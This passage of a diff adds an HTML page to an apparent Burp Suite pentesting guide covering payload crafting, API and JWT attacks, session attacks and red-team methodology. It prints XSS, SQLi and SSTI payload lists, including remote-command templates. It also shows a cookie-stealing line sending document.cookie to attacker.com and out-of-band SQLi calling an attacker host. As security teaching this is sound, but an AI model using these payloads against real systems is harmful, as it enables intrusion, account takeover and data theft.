+          </p>
+          <span class="chain-step__tool">Tool: Repeater + Proxy</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="info-box">
+      <div class="info-box__header">&#x26D3; Chaining Methodology</div>
+      <p>
+        Document each step of the chain in Organizer with detailed notes and screenshots. Use Repeater
+        tabs named sequentially (e.g., "Chain-1-IDOR", "Chain-2-SSRF") to maintain a clear audit trail.
+        When reporting, clearly show the escalation path from initial low-severity finding to critical impact.
+        This demonstrates the real-world risk that individual vulnerabilities pose when combined.
+      </p>
+    </div>
+  </section>
+
+  <!-- ===== PAYLOADS ===== -->
+  <section id="payloads" class="guide-section">
+    <div class="section-header">
+      <span class="section-label">// OFFENSIVE OPS</span>
+      <h2 class="section-title">Payload Crafting</h2>
+    </div>
+
+    <p class="section-intro">
+      Effective payload development is a critical skill for offensive security professionals. Burp Suite's
+      Intruder, Repeater, and Hackvertor extension provide powerful platforms for crafting, encoding,
+      and delivering sophisticated payloads. Below are essential payload collections organized by
+      vulnerability class, optimized for use within Burp Suite.
+    </p>
+
+    <h3>XSS Polyglot Payloads</h3>
+    <div class="code-block" data-lang="XSS Payloads">
+      <pre ngNonBindable><code># Basic Reflected XSS
+&lt;script&gt;alert(document.domain)&lt;/script&gt;
+&lt;img src=x onerror=alert(1)&gt;
+&lt;svg onload=alert(1)&gt;
+&lt;body onload=alert(1)&gt;
+
+# Event Handler Bypass
+&lt;details open ontoggle=alert(1)&gt;
+&lt;marquee onstart=alert(1)&gt;
+&lt;video src=x onerror=alert(1)&gt;
+&lt;input onfocus=alert(1) autofocus&gt;
+
+# Filter Bypass / WAF Evasion
+&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;
+&lt;img src=x oNeRrOr=alert(1)&gt;
+&lt;svg/onload=alert(1)&gt;
+&#x27;&quot;&gt;&lt;img src=x onerror=alert(1)&gt;
+
+# DOM-based XSS
+javascript:alert(document.domain)
+&#x27;-alert(1)-&#x27;
+&#x27;;alert(1)//
+&lt;img src=x onerror=eval(atob(&#x27;YWxlcnQoMSk=&#x27;))&gt;
+
+# Polyglot (works across multiple contexts)
+jaVasCript:/*-/*`/*\`/*&#x27;/*"/**/(/* */oNcliCk=alert() )//
+&lt;svg/onload=&#x27;&gt;&quot;&gt;&lt;img src=x onerror=alert(1)//&gt;</code></pre>
+    </div>
+
+    <h3>SQL Injection Payloads</h3>
+    <div class="code-block" data-lang="SQLi Payloads">
+      <pre ngNonBindable><code># Time-based Blind SQLi
+&#x27; OR SLEEP(5)-- -
+&#x27; AND (SELECT SLEEP(5) FROM dual)-- -
+1&#x27;; WAITFOR DELAY &#x27;0:0:5&#x27;-- -
+&#x27; || pg_sleep(5)-- -
+
+# Boolean-based Blind SQLi
+&#x27; OR 1=1-- -
+&#x27; OR &#x27;a&#x27;=&#x27;a
+&#x27; AND 1=1-- -
+&#x27; AND SUBSTRING(username,1,1)=&#x27;a&#x27;-- -
+
+# Error-based SQLi
+&#x27; AND extractvalue(1,concat(0x7e,(SELECT version())))-- -
+&#x27; AND updatexml(1,concat(0x7e,(SELECT user())),1)-- -
+&#x27; AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
+
+# UNION-based SQLi
+&#x27; UNION SELECT NULL,NULL,NULL-- -
+&#x27; UNION SELECT username,password,NULL FROM users-- -
+&#x27; UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables-- -
+
+# Out-of-Band SQLi
+&#x27;; EXEC master..xp_dirtree &#x27;//attacker.burpcollaborator.net/a&#x27;-- -
+&#x27; UNION SELECT load_file(&#x27;\\\\attacker.burpcollaborator.net\\a&#x27;)-- -</code></pre>
+    </div>
+
+    <h3>SSTI Payloads</h3>
+    <div class="code-block" data-lang="SSTI Payloads">
+      <pre ngNonBindable><code># Detection / Identification
+&#123;&#123;7*7&#125;&#125;             # Jinja2 / Twig =&gt; 49
+$&#123;7*7&#125;              # FreeMarker / EL =&gt; 49
+#&#123;7*7&#125;              # Thymeleaf =&gt; 49
+&lt;%= 7*7 %&gt;          # ERB =&gt; 49
+$&#123;&#123;7*7&#125;&#125;            # Pebble =&gt; 49
+
+# Jinja2 RCE
+&#123;&#123; config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;id&#x27;).read() &#125;&#125;
+&#123;&#123; request.__class__._load_form_data.__globals__.__builtins__.open(&#x27;/etc/passwd&#x27;).read() &#125;&#125;
+&#123;&#123; &#x27;&#x27;.__class__.__mro__[1].__subclasses__() &#125;&#125;
+
+# Twig RCE
+&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("id")&#125;&#125;
+
+# FreeMarker RCE
+&lt;#assign ex="freemarker.template.utility.Execute"?new()&gt;$&#123;ex("id")&#125;
+
+# Velocity RCE
+#set($x=&#x27;&#x27;)#set($rt=$x.class.forName(&#x27;java.lang.Runtime&#x27;))#set($chr=$x.class.forName(&#x27;java.lang.Character&#x27;))#set($str=$x.class.forName(&#x27;java.lang.String&#x27;))#set($ex=$rt.getRuntime().exec(&#x27;id&#x27;))</code></pre>
+    </div>
+
+    <div class="tip-box">
+      <div class="tip-box__header">&#x1F4A1; Payload Lists</div>
+      <p>
+        For comprehensive payload collections, use <strong>SecLists</strong> by Daniel Miessler
+        (<code>github.com/danielmiessler/SecLists</code>). Load wordlists directly into Intruder's
+        payload sets. Key directories: <code>Fuzzing/</code> for injection payloads,
+        <code>Passwords/</code> for credential attacks, <code>Discovery/</code> for content discovery,
+        and <code>Usernames/</code> for enumeration. Also explore PayloadsAllTheThings for
+        vulnerability-specific payload reference sheets.
+      </p>
+    </div>
+  </section>
+
+  <!-- ===== API HACKING ===== -->
+  <section id="api-hacking" class="guide-section">
+    <div class="section-header">
+      <span class="section-label">// OFFENSIVE OPS</span>
+      <h2 class="section-title">API Hacking</h2>
+    </div>
+
+    <p class="section-intro">
+      APIs are the backbone of modern web applications and represent a massive attack surface. Burp Suite
+      excels at API security testing with its ability to intercept, modify, and fuzz API requests across
+      REST, GraphQL, SOAP, and gRPC protocols. API-first architectures often have weaker security controls
+      than traditional web UIs, making them high-value targets during red team engagements.
+    </p>
+
+    <div class="evasion-columns">
+      <div class="evasion-column">
+        <h4>&#x1F310; REST API Attacks</h4>
+        <ul>
+          <li>BOLA / IDOR on resource endpoints</li>
+          <li>Mass assignment via extra JSON fields</li>
+          <li>HTTP method tampering (GET/PUT/DELETE)</li>
+          <li>API versioning bypass (/v1/ vs /v2/)</li>
+          <li>Rate limiting bypass on auth endpoints</li>
+          <li>Content-type manipulation</li>
+          <li>Excessive data exposure in responses</li>
+          <li>Injection via JSON parameters</li>
+        </ul>
+      </div>
+      <div class="evasion-column">
+        <h4>&#x1F4CA; GraphQL Attacks</h4>
+        <ul>
+          <li>Introspection query for schema disclosure</li>
+          <li>Batch query abuse for brute-forcing</li>
+          <li>Nested query DoS (resource exhaustion)</li>
+          <li>Mutation-based data manipulation</li>
+          <li>Field suggestion exploitation</li>
+          <li>Authorization bypass via aliased queries</li>
+          <li>SQL injection in query variables</li>
+          <li>IDOR through GraphQL node IDs</li>
+        </ul>
+      </div>
+      <div class="evasion-column">
+        <h4>&#x1F511; Authentication Attacks</h4>
+        <ul>
+          <li>JWT algorithm confusion (RS256&rarr;HS256)</li>
+          <li>JWT <code>none</code> algorithm bypass</li>
+          <li>JWK/JKU header injection</li>
+          <li>OAuth redirect_uri manipulation</li>
+          <li>OAuth state parameter CSRF</li>
+          <li>API key leakage in URLs/headers</li>
+          <li>Bearer token replay across tenants</li>
+          <li>PKCE downgrade attacks</li>
+        </ul>
+      </div>
+    </div>
+
+    <h3>GraphQL Introspection Query</h3>
+    <div class="code-block" data-lang="GraphQL">
+      <pre ngNonBindable><code># Full introspection query to dump the entire schema
+&#123;
+  __schema &#123;
+    queryType &#123; name &#125;
+    mutationType &#123; name &#125;
+    subscriptionType &#123; name &#125;
+    types &#123;
+      name
+      kind
+      description
+      fields(includeDeprecated: true) &#123;
+        name
+        description
+        args &#123;
+          name
+          type &#123;
+            name
+            kind
+            ofType &#123; name kind &#125;
+          &#125;
+        &#125;
+        type &#123;
+          name
+          kind
+          ofType &#123; name kind &#125;
+        &#125;
+      &#125;
+    &#125;
+  &#125;
+&#125;
+
+# Batch query for credential brute-forcing
+[
+  &#123;"query": "mutation &#123; login(user:\"admin\", pass:\"pass1\") &#123; token &#125; &#125;"&#125;,
+  &#123;"query": "mutation &#123; login(user:\"admin\", pass:\"pass2\") &#123; token &#125; &#125;"&#125;,
+  &#123;"query": "mutation &#123; login(user:\"admin\", pass:\"pass3\") &#123; token &#125; &#125;"&#125;
+]</code></pre>
+    </div>
+
+    <h3>JWT Attack Techniques</h3>
+    <div class="code-block" data-lang="JWT Attacks">
+      <pre ngNonBindable><code># 1. Algorithm None Attack
+# Change header to: &#123;"alg":"none","typ":"JWT"&#125;
+# Base64: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
+# Remove signature (everything after second dot)
+
+# 2. HMAC/RSA Confusion (RS256 -&gt; HS256)
+# If server uses RS256, change alg to HS256
+# Sign with the PUBLIC key (which is often accessible)
+# Server may verify HMAC using public key as secret
+
+# 3. JWK Header Injection
+# Add jwk header with attacker-controlled public key:
+&#123;
+  "alg": "RS256",
+  "typ": "JWT",
+  "jwk": &#123;
+    "kty": "RSA",
+    "n": "&lt;attacker-public-key-n&gt;",
+    "e": "AQAB"
+  &#125;
+&#125;
+
+# 4. KID Path Traversal
+# kid parameter may be used in file path:
+&#123;
+  "alg": "HS256",
+  "typ": "JWT",
+  "kid": "../../../dev/null"
+&#125;
+# Sign with empty string as secret
+
+# 5. Claim Tampering
+# Decode payload, modify claims:
+&#123;
+  "sub": "1234567890",
+  "name": "admin",
+  "role": "administrator",
+  "iat": 1700000000,
+  "exp": 9999999999
+&#125;</code></pre>
+    </div>
+  </section>
+
+  <!-- ===== SESSION ATTACKS ===== -->
+  <section id="session-attacks" class="guide-section">
+    <div class="section-header">
+      <span class="section-label">// OFFENSIVE OPS</span>
+      <h2 class="section-title">Session Attacks</h2>
+    </div>
+
+    <h3>Token Analysis with Sequencer</h3>
+    <p>
+      Use Burp Sequencer to collect and analyze session tokens. Weak randomness in token generation
+      can allow attackers to predict valid session tokens and hijack user accounts. Collect at least
+      10,000 samples for reliable statistical analysis and focus on the effective entropy measurement.
+    </p>
+
+    <h3>Race Condition Exploitation</h3>
+    <p>
+      Race conditions occur when an application processes multiple requests concurrently without proper
+      synchronization. Burp Suite's Repeater (with "Send group in parallel") and Turbo Intruder enable
+      precise timing attacks. Common targets include:
+    </p>
+    <ul class="feature-list">
+      <li><strong>Coupon/Discount Redemption:</strong> Apply the same coupon code multiple times by sending parallel requests</li>
+      <li><strong>Account Balance:</strong> Initiate multiple withdrawal requests simultaneously to exceed available balance</li>
+      <li><strong>Rate Limit Bypass:</strong> Send authentication attempts in parallel to bypass per-second rate limits</li>
+      <li><strong>File Upload:</strong> Race between upload and validation to bypass file type checks</li>
+    </ul>
+
+    <h3>Session Fixation &amp; Hijacking</h3>
+    <p>
+      Test whether the application regenerates session tokens after authentication. If the pre-authentication
+      session ID persists after login, the application is vulnerable to session fixation. Use Proxy's
+      HTTP history to track session token changes across the authentication flow.
+    </p>
+    <div class="code-block" data-lang="Testing Steps">
+      <pre ngNonBindable><code># Session Fixation Test
+1. Note the session token BEFORE login: SESSION=abc123
+2. Authenticate successfully
+3. Check the session token AFTER login: SESSION=???
+4. If SESSION=abc123 (unchanged) =&gt; VULNERABLE to session fixation
+
+# Session Hijacking via XSS
+Inject: &lt;script&gt;fetch(&#x27;https://attacker.com/steal?c=&#x27;+document.cookie)&lt;/script&gt;
+
+# Session Hijacking via Network Sniffing
+1. If cookies lack Secure flag =&gt; interceptable over HTTP
+2. If cookies lack HttpOnly flag =&gt; accessible via JavaScript
+3. If cookies lack SameSite attribute =&gt; vulnerable to CSRF</code></pre>
+    </div>
+
+    <h3>Authentication Bypass Techniques</h3>
+    <ul class="feature-list">
+      <li><strong>Default Credentials:</strong> Test common default username/password combinations on admin panels and APIs</li>
+      <li><strong>Password Reset Flaws:</strong> Analyze reset tokens for predictability, test host header injection for poisoned reset links</li>
+      <li><strong>Multi-Factor Bypass:</strong> Test for MFA step-skipping by directly accessing post-authentication endpoints</li>
+      <li><strong>Remember Me Tokens:</strong> Analyze "remember me" cookie generation for predictable patterns or weak encryption</li>
+      <li><strong>OAuth Misconfigurations:</strong> Test redirect_uri manipulation, state parameter absence, and scope escalation</li>
+    </ul>
+  </section>
+
+  <!-- ===== RED TEAM OPS ===== -->
+  <section id="redteam" class="guide-section">
+    <div class="section-header">
+      <span class="section-label">// OFFENSIVE OPS</span>
+      <h2 class="section-title">Red Team Operations</h2>
+    </div>
+
+    <h3>Kill Chain Methodology</h3>
+    <p>
+      Map Burp Suite tools to each phase of the cyber kill chain for structured red team operations:
+    </p>
+
+    <div class="kill-chain">
+      <div class="kill-chain__phase">
+        <div class="kill-chain__number">1</div>
+        <div class="kill-chain__content">
+          <h4>Initial Access</h4>
+          <p>
+            Identify entry points through content discovery, subdomain enumeration, and vulnerability scanning.
+            Use Scanner for automated detection, Intruder for credential attacks, and Collaborator for
+            out-of-band vulnerability confirmation (blind SSRF, blind XXE, blind SQLi).
+          </p>
+          <div class="kill-chain__tools">
+            <span class="kill-chain__tool">Intruder</span>
+            <span class="kill-chain__tool">Collaborator</span>
+            <span class="kill-chain__tool">Scanner</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="kill-chain__phase">
+        <div class="kill-chain__number">2</div>
+        <div class="kill-chain__content">
+          <h4>Execution</h4>
+          <p>
+            Exploit discovered vulnerabilities to execute commands or inject payloads. Use Repeater
+            for manual exploitation, Decoder for payload encoding/transformation, and extensions
+            for specialized attacks (JWT manipulation, deserialization exploits).
+          </p>
+          <div class="kill-chain__tools">
+            <span class="kill-chain__tool">Repeater</span>
+            <span class="kill-chain__tool">Decoder</span>
+            <span class="kill-chain__tool">Hackvertor</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="kill-chain__phase">
+        <div class="kill-chain__number">3</div>
+        <div class="kill-chain__content">
+          <h4>Persistence</h4>
+          <p>
+            Maintain access through web shells, backdoor accounts, or persistent XSS. Use Repeater
+            to upload web shells via file upload vulnerabilities and Logger++ to monitor ongoing
+            access to compromised endpoints.
+          </p>
+          <div class="kill-chain__tools">
+            <span class="kill-chain__tool">Repeater</span>
+            <span class="kill-chain__tool">Logger++</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="kill-chain__phase">
+        <div class="kill-chain__number">4</div>
+        <div class="kill-chain__content">
+          <h4>Privilege Escalation</h4>
+          <p>
+            Escalate from low-privileged access to admin or system-level control. Use Autorize
+            to identify authorization flaws, JWT Editor to manipulate token claims, and Repeater
+            to test IDOR patterns for accessing higher-privilege resources.
+          </p>
+          <div class="kill-chain__tools">
+            <span class="kill-chain__tool">Autorize</span>
+            <span class="kill-chain__tool">JWT Editor</span>
+            <span class="kill-chain__tool">AuthMatrix</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="kill-chain__phase">
+        <div class="kill-chain__number">5</div>
+        <div class="kill-chain__content">
+          <h4>Data Exfiltration</h4>
+          <p>
+            Demonstrate data access through SQL injection data extraction, SSRF-based internal
+            resource access, or direct API endpoint abuse. Use Intruder for bulk data enumeration
+            and Repeater for targeted extraction of sensitive records.
+          </p>
+          <div class="kill-chain__tools">
+            <span class="kill-chain__tool">Intruder</span>
+            <span class="kill-chain__tool">Repeater</span>
+            <span class="kill-chain__tool">Collaborator</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <h3>Post-Exploitation Techniques</h3>
+    <ul class="feature-list">
+      <li><strong>Internal Network Pivoting:</strong> Use SSRF to scan internal networks, access cloud metadata endpoints (169.254.169.254), and reach internal services not exposed to the internet</li>
+      <li><strong>Data Extraction:</strong> Leverage SQL injection with UNION queries, XXE with external entities, and SSRF with file:// protocol to extract sensitive data from databases and file systems</li>
+      <li><strong>Lateral Movement:</strong> Use discovered credentials and session tokens to access additional applications, admin panels, and API endpoints within the target organization</li>
+      <li><strong>Evidence Collection:</strong> Document all findings in Organizer with detailed notes, screenshots, and request/response pairs for comprehensive reporting</li>
+    </ul>
+
+    <h3>Reporting for Maximum Impact</h3>
+    <div class="info-box">
+      <div class="info-box__header">&#x1F4DD; Report Structure</div>
+      <p>
+        Structure your Burp Suite findings for maximum business impact. For each vulnerability:
+        (1) <strong>Executive Summary</strong> &mdash; business risk in non-technical terms,
+        (2) <strong>Technical Details</strong> &mdash; full request/response from Repeater showing the vulnerability,
+        (3) <strong>Reproduction Steps</strong> &mdash; step-by-step guide using Burp tools,
+        (4) <strong>Impact Assessment</strong> &mdash; what an attacker could achieve (data theft, account takeover, RCE),
+        (5) <strong>Remediation</strong> &mdash; specific code-level and configuration fixes.
+        Use Burp's built-in reporting (Professional) to generate HTML/XML reports and augment with
+        manual narrative for attack chains and business context.
+      </p>
+    </div>
+  </section>
+
+  <!-- Back to top -->
+  <div class="back-to-top">
+    <a (click)="scrollTo('overview')" (keydown.enter)="scrollTo('overview')" tabindex="0" role="button" class="back-to-top__link">&#x2191; Back to Top</a>
+  </div>
+
+</main>
